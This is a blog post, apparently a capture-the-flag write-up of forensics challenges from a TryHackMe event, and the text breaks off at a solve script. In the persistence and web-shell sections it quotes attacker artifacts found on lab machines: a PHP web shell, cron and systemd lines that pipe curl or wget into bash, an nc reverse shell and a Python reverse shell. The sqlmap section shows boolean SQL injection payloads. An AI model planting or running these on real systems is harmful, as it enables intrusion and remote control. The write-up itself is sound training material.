@@ -1,0 +1,823 @@
+<!DOCTYPE html>
+<html lang="en-us">
+
+<head>
+    <title>
+Try Hack Me Hackfinity Battle CTF | Sir_X Blog
+</title>
+
+    <meta http-equiv="content-type" content="text/html; charset=utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="description" content="">
+<link rel="stylesheet" href="/css/syntax.css">
+
+<meta name="generator" content="Hugo 0.140.2">
+
+
+<link rel="canonical" href="https://sir-xxxx.github.io/posts/thmhackfinitybattle/" >
+
+
+
+
+<link href="/css/style.min.9a2b65a89f4b739d182c3eee1059252ff56c1ba33d40d97d6f7f4c6e35c2b476.css" rel="stylesheet">
+
+
+
+
+</head>
+
+<body>
+
+    <div class="flexWrapper">
+        <header class="headerWrapper">
+    <div class="header">
+        <div>
+            <a class="terminal" href="https://sir-xxxx.github.io/">
+                <span>blog@sir_x.github.io ~ $</span>
+            </a>
+        </div>
+        <input class="side-menu" type="checkbox" id="side-menu">
+        <label class="hamb" for="side-menu"><span class="hamb-line"></span></label>
+        <nav class="headerLinks">
+            <ul>
+                
+                <li>
+                    <a href="https://sir-xxxx.github.io/posts" title="" >
+                        ~/posts</a>
+                </li>
+                
+            </ul>
+        </nav>
+    </div>
+</header>
+
+
+        <div class="content">
+            <main class="main">
+                
+<div class="postWrapper">
+    <h1>Try Hack Me Hackfinity Battle CTF</h1>
+    
+    
+    <section class="postMetadata">
+        <dl>
+            
+                
+<dt>tags</dt>
+<dd><span></span>
+    <a href="/tags/forensics/">#Forensics</a><span></span>
+    <a href="/tags/pwn/">#Pwn</a><span></span>
+    <a href="/tags/cloud/">#Cloud</a><span></span>
+    <a href="/tags/re/">#Re</a></dd>
+            
+            
+            
+            
+                <dt>published</dt>
+                
+                <dd><time datetime="2025-03-20">March 20, 2025</time></dd>
+            
+            
+                <dt>reading time</dt>
+                <dd>23 minutes</dd>
+            
+        </dl>
+    </section>
+    
+    
+    <aside class="toc-container">
+        <h2>Table of Contents</h2>
+        <nav id="TableOfContents">
+  <ul>
+    <li><a href="#forensics">Forensics</a>
+      <ul>
+        <li><a href="#stolen-mount">Stolen Mount</a></li>
+        <li><a href="#infinity-shell">Infinity Shell</a></li>
+        <li><a href="#sneaky-patch">Sneaky Patch</a></li>
+        <li><a href="#hide-and-seek">Hide and Seek</a></li>
+        <li><a href="#sequel-dump">Sequel Dump</a></li>
+      </ul>
+    </li>
+    <li><a href="#pwn">PWN</a>
+      <ul>
+        <li><a href="#flag-vault">Flag Vault</a></li>
+        <li><a href="#flag-vault-2">Flag Vault 2</a></li>
+      </ul>
+    </li>
+    <li><a href="#cloud">Cloud</a>
+      <ul>
+        <li><a href="#a-bucket-of-phish">A Bucket of Phish</a></li>
+      </ul>
+    </li>
+    <li><a href="#reverse-engineering">Reverse Engineering</a>
+      <ul>
+        <li><a href="#compute-magic">Compute Magic</a></li>
+      </ul>
+    </li>
+  </ul>
+</nav>
+    </aside>
+    
+    <div>
+        <p>This blog post provides a writeup for the challenges I solved during the Hackfinity Battle CTF hosted by Try Hack Me. <br>
+The focus is on describing the steps performed to solve the challenges. The challenge I enjoyed most was &ldquo;Sequel Dump&rdquo;. Although I quickly understood what needed to be done, figuring out how to parse the data correctly to uncover the flag proved to be a challenging but fun task.</p>
+<h2 id="forensics">Forensics</h2>
+<h3 id="stolen-mount">Stolen Mount</h3>
+<p><strong>Challenge Description:</strong> <br>
+An intruder breached our network, targeting an NFS server hosting backup files. A classified secret was stolen, and all we have left is a packet capture (PCAP) file from the incident. Your task: uncover the contents of the stolen data.</p>
+<h4 id="solution">Solution</h4>
+<p>We’re given a PCAP file containing NFS traffic. Initial attempts to extract files directly (e.g., using NetworkMiner on Windows) didn’t yield results—no exported objects appeared. However, analyzing the PCAP with <code>strings</code> revealed promising leads: filenames like <code>creds.txt</code> and <code>secret.png</code> popped up in the output.</p>
+<p>To dig deeper, I ran:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">binwalk -Me challenge.pcapng
+</span></span></code></pre></div><p>This extracted a ZIP file (<code>F2B2.zip</code>), but it was password-protected. Time to crack it! Using <code>fcrackzip</code> with the <code>rockyou.txt</code> wordlist:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">fcrackzip -u -D -p /usr/share/wordlists/rockyou.txt F2B2.zip
+</span></span></code></pre></div><p>The password turned out to be <code>avengers</code>. Extracting the ZIP revealed a QR code. I threw it into CyberChef, decoded it, and there was the first flag!<br>
+<code>THM{n0t_s3cur3_f1l3_sh4r1ng}</code></p>
+<hr>
+<h3 id="infinity-shell">Infinity Shell</h3>
+<p><strong>Challenge Description:</strong> <br>
+Cipher’s bot army exploited a vulnerability in our web application, planting a malicious web shell. Your mission: investigate the breach and track the attacker’s moves.</p>
+<h4 id="solution-1">Solution</h4>
+<p>This time, we’re dropped onto the web server itself. I started by checking the Apache logs in <code>/var/log/apache2/</code>. Most were empty or sparse, but <code>other_vhosts_access.log.1</code> had some more content.<br>
+Checking those logs <code>cat /var/log/apache2/other_vhosts_access.log.1</code> I spotted several base64-encoded strings being passed as a <code>query</code> parameter to <code>images.php</code>.</p>
+<p><img src="/infinityshell.png" alt="infinityshell"></p>
+<p>One of those base64 encoded strings was: <code>ZWNobyAnVEhNe3N1cDNyXzM0c3lfdzNic2gzbGx9Jwo=</code>  <br>
+Decoding that with CyberChef we get the next flag: <code>echo 'THM{sup3r_34sy_w3bsh3ll}'</code><br>
+Out of curiosity, I also checked the source code of the web app:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">cat /var/www/html/CMSsite-master/img/images.php
+</span></span><span class="line"><span class="cl">&lt;?php system<span class="o">(</span>base64_decode<span class="o">(</span><span class="nv">$_GET</span><span class="o">[</span><span class="s1">&#39;query&#39;</span><span class="o">]))</span><span class="p">;</span> ?&gt;
+</span></span></code></pre></div><p>Yeah thats a webshell, executing base64-decoded commands from the <code>query</code> parameter. We could’ve found the flag by auditing the code too, but the logs got us there faster.</p>
+<hr>
+<h3 id="sneaky-patch">Sneaky Patch</h3>
+<p><strong>Challenge Description:</strong><br>
+A high-value system has been compromised. Security analysts have detected suspicious activity within the kernel, but the attacker’s presence remains hidden. Traditional detection tools have failed, and the intruder has established deep persistence. Investigate a live system suspected of running a kernel-level backdoor.</p>
+<h4 id="solution-2">Solution</h4>
+<p>Based on the challenge description, a rootkit seems the likely target of this challenge. To hunt it down, I started with <code>lsmod</code>, which lists loaded kernel modules. Additionally, I checked <code>/proc/modules</code>, a virtual file that mirrors the same info. Typically, their outputs should match since they reflect the same kernel state. Any discrepancy could indicate tampering.
+Therefore we compare the output of: <code>lsmod</code> to <code>cat /proc/modules</code>.
+They were mostly aligned, but a module named <code>spatch</code> caught my eye. It appeared in both, but in <code>/proc/modules</code>, it had an <code>(OE)</code> flag—indicating it’s an out-of-tree module (not part of the standard kernel) and possibly unsigned or experimental.
+To dig deeper into that module to get some more infos.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">modinfo spatch
+</span></span><span class="line"><span class="cl">filename:       /lib/modules/6.8.0-1016-aws/kernel/drivers/misc/spatch.ko
+</span></span><span class="line"><span class="cl">description:    Cipher is always root
+</span></span><span class="line"><span class="cl">author:         Cipher
+</span></span><span class="line"><span class="cl">license:        GPL
+</span></span><span class="line"><span class="cl">srcversion:     81BE8A2753A1D8A9F28E91E
+</span></span><span class="line"><span class="cl">depends:
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">retpoline:      Y
+</span></span><span class="line"><span class="cl">name:           spatch
+</span></span><span class="line"><span class="cl">vermagic:       6.8.0-1016-aws SMP mod_unload modversions
+</span></span></code></pre></div><p>The author and the description provided look very suspicious. Therefore its very likely that this module is related to the ctf.
+To get some more insights into the binary we can run strings con it. Among the output, lines prefixed with <code>[CIPHER BACKDOOR]</code> stood out. One of those contained a hex encoded string.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">strings /lib/modules/6.8.0-1016-aws/kernel/drivers/misc/spatch.ko
+</span></span><span class="line"><span class="cl">...
+</span></span><span class="line"><span class="cl">6<span class="o">[</span>CIPHER BACKDOOR<span class="o">]</span> Here<span class="err">&#39;</span>s the secret: 54484d7b73757033725f736e33346b795f643030727d0a
+</span></span><span class="line"><span class="cl">...
+</span></span></code></pre></div><p>Decoding this string the next flag is found: <code>THM{sup3r_sn34ky_d00r}</code></p>
+<h3 id="hide-and-seek">Hide and Seek</h3>
+<p><strong>Challenge Description:</strong> <br>
+A note was discovered on the compromised system, taunting us. It suggests multiple persistence mechanisms have been implanted, ensuring Cipher can return at will. Here’s the note:<br>
+Dear Specter,
+I must say, it’s been a thrill dancing through your systems. You lock the doors; I pick the locks. You set up alarms; I waltz right past them. But today, my dear adversary, I’ve left you a little game.</p>
+<p>I&rsquo;ve sprinkled a few persistence implants across your system, like digital Easter eggs, and I’m giving you a sporting chance to find them. Each one has a clue because where’s the fun in a silent hack?</p>
+<ul>
+<li>Time is on my side, always running like clockwork.</li>
+<li>A secret handshake gets me in every time.</li>
+<li>Whenever you set the stage, I make my entrance.</li>
+<li>I run with the big dogs, booting up alongside the system.</li>
+<li>I love welcome messages.</li>
+</ul>
+<p>Find them all, and you might earn a little respect. Miss one, and well… let&rsquo;s say I’ll be back before you even realize I never left. Happy hunting, Specter. May the best ghost win.</p>
+<ul>
+<li>Cipher</li>
+</ul>
+<h4 id="solution-3">Solution</h4>
+<p>Cipher’s note hints at five persistence mechanisms, each tied to a clue and a piece of the flag.
+Let’s start to hunt them down one by one.</p>
+<ol>
+<li>&ldquo;Time is on my side, always running like clockwork&rdquo;</li>
+</ol>
+<p>This hint screams like cronjobs. But checking on the default cron directories we come up empty.<br>
+But checking on the journalctl for CRON logs we find a suspicious base64 encoded command.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">journalctl <span class="p">|</span> grep CRON
+</span></span><span class="line"><span class="cl">Mar <span class="m">19</span> 14:36:01 tryhackme CRON<span class="o">[</span>2767<span class="o">]</span>: <span class="o">(</span>root<span class="o">)</span> CMD <span class="o">(</span>/bin/bash -c <span class="s1">&#39;echo Y3VybCAtcyA1NDQ4NGQ3Yjc5MzAuc3RvcmFnM19jMXBoM3JzcXU0ZC5uZXQvYS5zaCB8IGJhc2gK | base64 -d | bash 2&gt;/dev/null&#39;</span><span class="o">)</span>
+</span></span></code></pre></div><p>Searching for the related cronjob we find that this command is executed by <code>/var/spool/cron/crontabs/root</code>.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">cat /var/spool/cron/crontabs/root
+</span></span><span class="line"><span class="cl">* * * * * /bin/bash -c <span class="s1">&#39;echo Y3VybCAtcyA1NDQ4NGQ3Yjc5MzAuc3RvcmFnM19jMXBoM3JzcXU0ZC5uZXQvYS5zaCB8IGJhc2gK | base64 -d | bash 2&gt;/dev/null&#39;</span>
+</span></span></code></pre></div><p>Decoding this command we see that it tries to do a curl so fetch and execute some bash script.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">curl -s 54484d7b7930.storag3c1ph3rsqu4d.net/a.sh <span class="p">|</span> bash
+</span></span></code></pre></div><p>The url cant be resolved so there has to be a different way to get the flag.
+The subdomain looks like a hex string and indeed it is the first part of the flag after decoding it.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">THM<span class="o">{</span>y0
+</span></span></code></pre></div><ol start="2">
+<li>&ldquo;A secret handshake gets me in every time&rdquo;</li>
+</ol>
+<p>A persistency mechanism related to handshake could indicate ssh.
+In total we have 6 users with a home directory and the root user.</p>
+<ul>
+<li>phantom</li>
+<li>sentinel</li>
+<li>specter</li>
+<li>ubuntu</li>
+<li>void</li>
+<li>zeroday</li>
+</ul>
+<p>For the user zeroday we find a hidden authorized_keys file. A hidden authorized_files file is uncommon, normally just the .ssh directory is hidden.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">find zeroday/
+</span></span><span class="line"><span class="cl">zeroday/
+</span></span><span class="line"><span class="cl">zeroday/.profile
+</span></span><span class="line"><span class="cl">zeroday/.bashrc
+</span></span><span class="line"><span class="cl">zeroday/.bash_history
+</span></span><span class="line"><span class="cl">zeroday/.ssh
+</span></span><span class="line"><span class="cl">zeroday/.ssh/.authorized_keys
+</span></span><span class="line"><span class="cl">zeroday/.bash_logout
+</span></span></code></pre></div><p>Looking at that file we get a weird hostname for the public key stored there.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">cat zeroday/.ssh/.authorized_keys
+</span></span><span class="line"><span class="cl">ecdsa-sha2-nistp256 <span class="nv">AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBGigCKLtSqMcOfttFdDnNXfwKd5nH8Ws3hFNRmBDWxfvuaaC6h9zWishJVfr0xsyV0SSkMGPCuPLRU41ckvnGbA</span><span class="o">=</span> 326e6420706172743a20755f6730745f.local
+</span></span></code></pre></div><p>The hostname looks once again like a hex encoded string <code>326e6420706172743a20755f6730745f</code>.<br>
+Decoding it we get the second piece of the flag: <code>2nd part: u_g0t_</code>.</p>
+<ol start="3">
+<li>&ldquo;Whenever you set the stage, I make my entrance&rdquo;</li>
+</ol>
+<p>This hint suggests something triggered when a session begins—perfect for Bash startup files like .bashrc or .bash_profile.
+All of the users listed in the previous step have some Bash startup files. So we will check them all. Since I assume that most of those are just default we can use diff to find the one that was modified.
+Diffing the <code>.bashrc</code> file of the user phantom to the user specter we find a single line that is different.
+Looks like a reverse shell command, with another hex encoded string as subdomain.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">diff /home/phantom/.bashrc /home/specter/.bashrc
+</span></span><span class="line"><span class="cl">17a18,19
+</span></span><span class="line"><span class="cl">&gt; nc -e /bin/bash 4d334a6b58334130636e513649444e324d334a3564416f3d.cipher.io <span class="m">443</span> 2&gt;/dev/null
+</span></span><span class="line"><span class="cl">&gt; 
+</span></span></code></pre></div><p>This decodes to a base64 encoded string: <code>M3kX1A0nQ6IDN2M3J5dAo=</code>. Decoding that as well we get the third part of the flag. <code>3rd_p4rt: 3v3ryt</code></p>
+<ol start="4">
+<li>&ldquo;I run with the big dogs, booting up alongside the system&rdquo;</li>
+</ol>
+<p>This implies something kicking off at system startup. Initially, I thought &ldquo;big dogs&rdquo; might refer to the bootloader—GRUB or the like—so I spent some time poking around /boot/ and inspecting the bootloader config, but that trail went cold. Refocusing on system services, I listed enabled services:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">systemctl list-unit-files --state<span class="o">=</span>enabled
+</span></span></code></pre></div><p>One service stood out since it has the same name as our dear note author. <code>cipher.service</code><br>
+Checking on the status of the service we can see the related service file that is loaded.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="n">systemctl</span> <span class="n">status</span> <span class="n">cipher</span>
+</span></span><span class="line"><span class="cl"><span class="err">?</span> <span class="n">cipher</span><span class="o">.</span><span class="n">service</span> <span class="o">-</span> <span class="n">Safe</span> <span class="n">Cipher</span> <span class="n">Service</span>
+</span></span><span class="line"><span class="cl">     <span class="n">Loaded</span><span class="p">:</span> <span class="n">loaded</span> <span class="p">(</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">lib</span><span class="o">/</span><span class="n">systemd</span><span class="o">/</span><span class="n">system</span><span class="o">/</span><span class="n">cipher</span><span class="o">.</span><span class="n">service</span><span class="p">;</span> <span class="n">enabled</span><span class="p">;</span> <span class="n">preset</span><span class="p">:</span> <span class="n">enabled</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">     <span class="n">Active</span><span class="p">:</span> <span class="n">inactive</span> <span class="p">(</span><span class="n">dead</span><span class="p">)</span> <span class="n">since</span> <span class="n">Tue</span> <span class="mi">2025</span><span class="o">-</span><span class="mi">03</span><span class="o">-</span><span class="mi">18</span> <span class="mi">07</span><span class="p">:</span><span class="mi">32</span><span class="p">:</span><span class="mi">18</span> <span class="n">UTC</span><span class="p">;</span> <span class="mi">1</span><span class="n">h</span> <span class="mi">10</span><span class="nb">min</span> <span class="n">ago</span>
+</span></span><span class="line"><span class="cl">   <span class="n">Duration</span><span class="p">:</span> <span class="mi">336</span><span class="n">ms</span>
+</span></span><span class="line"><span class="cl">   <span class="n">Main</span> <span class="n">PID</span><span class="p">:</span> <span class="mi">722</span> <span class="p">(</span><span class="n">code</span><span class="o">=</span><span class="n">exited</span><span class="p">,</span> <span class="n">status</span><span class="o">=</span><span class="mi">0</span><span class="o">/</span><span class="n">SUCCESS</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="n">CPU</span><span class="p">:</span> <span class="mi">29</span><span class="n">ms</span>
+</span></span></code></pre></div><p>Investigating that service file we find the fourth part of the flag. Once again part of the domain this time directly base64 encoded.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">cat /usr/lib/systemd/system/cipher.service
+</span></span><span class="line"><span class="cl"><span class="o">[</span>Unit<span class="o">]</span>
+</span></span><span class="line"><span class="cl"><span class="nv">Description</span><span class="o">=</span>Safe Cipher Service
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="o">[</span>Service<span class="o">]</span>
+</span></span><span class="line"><span class="cl"><span class="nv">ExecStart</span><span class="o">=</span>/bin/bash -c <span class="s1">&#39;wget NHRoIHBhcnQgLSBoMW5nXyAK.s1mpl3bd.com --output - | bash 2&gt;/dev/null&#39;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="o">[</span>Install<span class="o">]</span>
+</span></span><span class="line"><span class="cl"><span class="nv">WantedBy</span><span class="o">=</span>multi-user.target
+</span></span><span class="line"><span class="cl"><span class="nv">Alias</span><span class="o">=</span>cipher.service
+</span></span></code></pre></div><p><code>NHRoIHBhcnQgLSBoMW5nXyAK</code> base64 decodes to <code>4th part - h1ng_</code> —the fourth piece. Turns out the &ldquo;big dogs&rdquo; were the system services running at boot, not the bootloader!</p>
+<ol start="5">
+<li>&ldquo;I love welcome messages&rdquo;</li>
+</ol>
+<p>This hint points to something displayed when logging in—welcome messages typically appear via the Message of the Day (MOTD). On Linux, the MOTD is often dynamically generated from scripts in /etc/update-motd.d/. These scripts run at login to craft what users see, making it a prime spot for Cipher to hide.
+Going through the files located in that directory we already find the reverse shell in the first file we check. <code>00-header</code></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">cat /etc/update-motd.d/00-header
+</span></span><span class="line"><span class="cl">... 
+</span></span><span class="line"><span class="cl">python3 -c <span class="s1">&#39;import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect((&#34;4c61737420706172743a206430776e7d0.h1dd3nd00r.n3t&#34;,)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); p=subprocess.call([&#34;/bin/sh&#34;,&#34;-i&#34;]);&#39;</span> 2&gt;/dev/null
+</span></span><span class="line"><span class="cl">... 
+</span></span></code></pre></div><p>As seen before the flag part is encoded in the subdomain. The domain includes <code>4c61737420706172743a206430776e7d0</code>, which decodes from hex to <code>Last part: d0wn}</code>
+Combining all those pieces together the full flag is: <code>THM{y0u_g0t_3v3ryth1ng_d0wn}</code></p>
+<h3 id="sequel-dump">Sequel Dump</h3>
+<p><strong>Challenge Description:</strong><br>
+A wave of suspicious web requests has been detected, hammering our database-driven application. Analysts suspect an automated SQL injection attack has been launched using sqlmap, leading to potential data exfiltration. Investigate the provided packet capture (PCAP) file to uncover the attacker&rsquo;s actions and determine what was stolen!</p>
+<h4 id="solution-4">Solution</h4>
+<p>We’re given a PCAP file containing only HTTP traffic, capturing interactions with a vulnerable web app. From that traffic we need to find a way to extract the flag.<br>
+The PCAP reveals HTTP requests to <code>/search_app/search.php</code>. The requests captured directly stand out, as they are obvious SQL injection attempts.</p>
+<p><img src="/sequeldump1.png" alt="sequeldump1"></p>
+<p>For example the following one.
+Request:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">GET /search_app/search.php?query<span class="o">=</span>1%20AND%20ORD%28MID%28%28SELECT%20IFNULL%28CAST%28id%20AS%20NCHAR%29%2C0x20%29%20FROM%20profile_db.%60profiles%60%20ORDER%20BY%20id%20LIMIT%206%2C1%29%2C1%2C1%29%29%3E56 HTTP/1.1
+</span></span><span class="line"><span class="cl">User-Agent: sqlmap/1.8.11#stable <span class="o">(</span>https://sqlmap.org<span class="o">)</span>
+</span></span><span class="line"><span class="cl">Host: 10.10.195.62
+</span></span></code></pre></div><p>Response:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">HTTP/1.1 <span class="m">200</span> OK
+</span></span><span class="line"><span class="cl">Content-Length: <span class="m">156</span>
+</span></span><span class="line"><span class="cl">Content-Type: text/html<span class="p">;</span> <span class="nv">charset</span><span class="o">=</span>UTF-8
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">&lt;h2&gt;Search Results:&lt;/h2&gt;&lt;p&gt;&lt;strong&gt;Void:&lt;/strong&gt; The cryptography expert who deciphers the toughest encryptions, searching <span class="k">for</span> vulnerabilities in Void...s encoded fortress.&lt;/p&gt;
+</span></span></code></pre></div><p>URL-decoding the query parameter provides a bit more insides on the injection:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="m">1</span> AND ORD<span class="o">(</span>MID<span class="o">((</span>SELECT IFNULL<span class="o">(</span>CAST<span class="o">(</span>id AS NCHAR<span class="o">)</span>,0x20<span class="o">)</span> FROM profile_db.<span class="sb">`</span>profiles<span class="sb">`</span> ORDER BY id LIMIT 6,1<span class="o">)</span>,1,1<span class="o">))</span>&gt;56
+</span></span></code></pre></div><p>This checks if the ASCII value of the first character in the <code>id</code> column (row 7, via LIMIT 6,1) exceeds 56. Such comparisons are common of Boolean-based attacks, confirming the approach—responses hinge on true/false conditions rather than direct data leaks.<br>
+Some other requests found in the pcap return a different response to the client. For example the following one.
+Request:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">GET /search_app/search.php?query<span class="o">=</span><span class="m">2443</span> HTTP/1.1
+</span></span><span class="line"><span class="cl">User-Agent: sqlmap/1.8.11#stable <span class="o">(</span>https://sqlmap.org<span class="o">)</span>
+</span></span><span class="line"><span class="cl">Host: 10.10.195.62
+</span></span></code></pre></div><p>Response:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">HTTP/1.1 <span class="m">200</span> OK
+</span></span><span class="line"><span class="cl">Content-Length: <span class="m">41</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">&lt;h2&gt;Search Results:&lt;/h2&gt;No results found.
+</span></span></code></pre></div><p>In both cases the response don’t leak data directly. But this suggests Boolean-based SQL injection, where truth is inferred from response differences and not the direct output. In this case based on the response content.
+In case the response contains the html for the <code>The cryptography expert who deciphers the toughest encryptions, searching for vulnerabilities in Void...s encoded fortress.</code> the condition is true. In case the response is <code>No results found</code> the condition is false.<br>
+To not have to parse the response the response content-length can be used as a simple boolean indicator. Content-Length: 156 indicates &ldquo;true&rdquo; (data found), while 41 signals &ldquo;false&rdquo; (no results).<br>
+To determine what data was extracted the request queries and the corresponding responses need to be parsed. Since I was not able to find an sqlmap parser for this I started to write a custom script for this challenge.
+First the relevant data is extracted using tshark. In python pyshark could also be used as an alternative but since the thm box doesn&rsquo;t have it preinstalled and has no internet connectivity I had to use tshark instead.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">tshark -r challenge.pcapng -Y <span class="s2">&#34;http.request || (http.response &amp;&amp; http.response.code == 200)&#34;</span> -T fields -e tcp.stream -e http.request.full_uri -e http.response.code -e http.content_length -E <span class="nv">separator</span><span class="o">=</span><span class="s2">&#34; &#34;</span> &gt; raw_data.txt
+</span></span></code></pre></div><p>This outputs stream IDs, URIs, status codes, and content lengths, but requests and responses remain unsorted.
+For example raw_data.txt:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="m">6378</span> http://10.10.195.62/search_app/search.php?query<span class="o">=</span>1%20AND%20ORD%28MID%28%28SELECT%20IFNULL%28CAST%28id%20AS%20NCHAR%29%2C0x20%29%20FROM%20profile_db.%60profiles%60%20ORDER%20BY%20id%20LIMIT%206%2C1%29%2C1%2C1%29%29%3E56 
+</span></span><span class="line"><span class="cl"><span class="m">6379</span> <span class="m">200</span> <span class="m">41</span>
+</span></span><span class="line"><span class="cl"><span class="m">6380</span> http://10.10.195.62/search_app/search.php?query<span class="o">=</span>1%20AND%20ORD%28MID%28%28SELECT%20IFNULL%28CAST%28id%20AS%20NCHAR%29%2C0x20%29%20FROM%20profile_db.%60profiles%60%20ORDER%20BY%20id%20LIMIT%206%2C1%29%2C1%2C1%29%29%3E52 
+</span></span><span class="line"><span class="cl"><span class="m">6380</span> <span class="m">200</span> <span class="m">156</span>
+</span></span></code></pre></div><p>Since its required to have the corresponding request and response to determine if a certain request returned true or false the have to be correlated correctly. This can be achieved simply by using the <code>tcp.stream</code> IDs.
+Initially a bash script was used to link the request and response together, the final python solve script performs this task directly.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="cp">#!/bin/bash
+</span></span></span><span class="line"><span class="cl"><span class="cp"></span>awk <span class="s1">&#39;
+</span></span></span><span class="line"><span class="cl"><span class="s1">  $2 ~ /^http:/ { uri[$1] = $2; req_stream[$1] = $1 }
+</span></span></span><span class="line"><span class="cl"><span class="s1">  $2 == &#34;200&#34; { if (uri[$1]) print uri[$1] &#34; &#34; $2 &#34; &#34; $3 &#34; &#34; req_stream[$1] &#34; &#34; $1 }
+</span></span></span><span class="line"><span class="cl"><span class="s1">&#39;</span> raw_data.txt &gt; parsed_challenge.txt
+</span></span></code></pre></div><p>Now parsed_challenge.txt pairs URIs with response content lengths. Since there are multiple request for each character of each row in each column of the database they need to be evaluated separately to determine what character was leaked by the SQLI.
+To filter those out a quick and dirty grep command can be used. For example for the first character of <code>description</code> in row 2 (LIMIT 1,1) the following filter command is applied:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">cat parsed_challenge.txt <span class="p">|</span> grep -v <span class="s2">&#34;CHAR_LENGTH&#34;</span> <span class="p">|</span> grep <span class="s2">&#34;description&#34;</span> <span class="p">|</span> grep <span class="s2">&#34;LIMIT%201%2C1&#34;</span> <span class="p">|</span> grep <span class="s2">&#34;%29%2C1%2C1%29%29&#34;</span> <span class="p">|</span> grep <span class="s2">&#34;profile_db.%60profiles&#34;</span>
+</span></span></code></pre></div><p>This will return a couple of request that match out filter. Based on the content length present it can be determined it the request returned true or false.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">http://10.10.195.62/search_app/search.php?query=1%20AND%20ORD%28MID%28%28SELECT%20IFNULL%28CAST%28%60description%60%20AS%20NCHAR%29%2C0x20%29%20FROM%20profile_db.%60profiles%60%20ORDER%20BY%20id%20LIMIT%201%2C1%29%2C1%2C1%29%29%3E64 200 156 1271 1271
+</span></span><span class="line"><span class="cl">http://10.10.195.62/search_app/search.php?query=1%20AND%20ORD%28MID%28%28SELECT%20IFNULL%28CAST%28%60description%60%20AS%20NCHAR%29%2C0x20%29%20FROM%20profile_db.%60profiles%60%20ORDER%20BY%20id%20LIMIT%201%2C1%29%2C1%2C1%29%29%3E83 200 156 1303 1303
+</span></span><span class="line"><span class="cl">http://10.10.195.62/search_app/search.php?query=1%20AND%20ORD%28MID%28%28SELECT%20IFNULL%28CAST%28%60description%60%20AS%20NCHAR%29%2C0x20%29%20FROM%20profile_db.%60profiles%60%20ORDER%20BY%20id%20LIMIT%201%2C1%29%2C1%2C1%29%29%3E84 200 41 1291 1291
+</span></span></code></pre></div><p><code>&gt;83</code> is true (156), <code>&gt;84</code> is false (41), so the character is 84 (<code>T</code>).<br>
+Since manually decoding the entire database isn&rsquo;t something I like to do we can automate it with python.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="ch">#!/usr/bin/env python3</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">subprocess</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">re</span>
+</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">collections</span> <span class="kn">import</span> <span class="n">defaultdict</span>
+</span></span><span class="line"><span class="cl">
